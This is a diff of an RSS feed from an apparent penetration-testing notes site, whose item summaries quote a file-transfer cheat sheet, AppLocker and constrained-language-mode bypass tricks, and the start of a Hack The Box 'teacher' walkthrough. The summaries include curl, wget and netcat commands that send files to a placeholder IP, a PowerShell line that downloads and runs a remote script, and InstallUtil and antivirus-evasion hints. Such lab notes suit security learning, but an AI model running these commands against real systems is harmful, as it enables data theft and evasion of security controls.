@@ -82,10 +82,10 @@ SSHFS is built on SFTP.</description>
     
     <item>
       <title>File Transfer</title>
-      <link>/filetransfer/</link>
+      <link>/concepts/file-transfer/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
-      <guid>/filetransfer/</guid>
+      <guid>/concepts/file-transfer/</guid>
       <description>##################Linux########################## 1# Python http server listener = python3 -m http.server 9090 listener = python -m simpleHTTPServer 9090 upload = curl -F &#39;data=@home/Documents&#39; IP_ADDRESS download = curl http://IP_ADDRESS -o file Note for wget post method youll need to use netcat instead of python doesn&#39;t support post. upload = wget --post-file user.txt http://IP_ADDRESS:PORT download = wget http://address:9090/filename 2# Netcat notice with this method , sender &amp;lt;, reciever &amp;gt;. -w wait, -l listener -p port upload = nc -w 3 [your_ip] 1337 &amp;lt; file.</description>
     </item>
     
@@ -173,10 +173,19 @@ so it turns out its not sql injections pretty happy with that.</description>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       
       <guid>/concepts/bypass/</guid>
-      <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions.
-If PowerShell version 2 is available you may be able to use this trick.
-PowerShell -Version 2 -ExecutionPolicy ByPass -command &amp;quot;&amp;quot;  to check for constrained language mode.
-$ExecutionContext.SessionState.LanguageMode  $ExecutionContext.SessionState.LanguageMode = &amp;quot;FullLanguage&amp;quot;  ie (New-Object Net.WebClient).DownloadString(&#39;http://changeme/powerview.ps1&#39;)  [System.Console]::WriteLine(&amp;quot;Hello&amp;quot;)  c:\windows\microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=true /U .\meh.exe  Bypassing anti virus</description>
+      <description>I have kept running in applocker and antivirus, and CLM (constrained language mode) I would like to cover some different ways to bypass these restrictions. CLM designed to make our job harder. Basically takes away allot methods and invoke. Which means we can&amp;rsquo;t just call powerview and run in it memory. you could still download it and bypass Defender with some kind of encoding/encryption.
+CLM uses umci policy to determine what powershell scripts are approved(whitelisted).</description>
+    </item>
+    
+    <item>
+      <title>teacher</title>
+      <link>/hackthebox/boxes/teacher/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>/hackthebox/boxes/teacher/</guid>
+      <description>nmap -sT -T3 -PS80,443,8000,8443,8800 -p 80,443,8000,8443,8080 -oA http-enum-results &amp;ndash;script=http-enum teacher.htb
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-01-24 16:27 EST Nmap scan report for teacher.htb (10.10.10.153) Host is up (0.043s latency).
+PORT STATE SERVICE 80/tcp open http | http-enum: | /css/: Potentially interesting directory w/ listing on &amp;lsquo;apache/2.4.25 (debian)&amp;rsquo; | /images/: Potentially interesting directory w/ listing on &amp;lsquo;apache/2.4.25 (debian)&amp;rsquo; | /js/: Potentially interesting directory w/ listing on &amp;lsquo;apache/2.4.25 (debian)&amp;rsquo; |_ /manual/: Potentially interesting folder</description>
     </item>
     
   </channel>
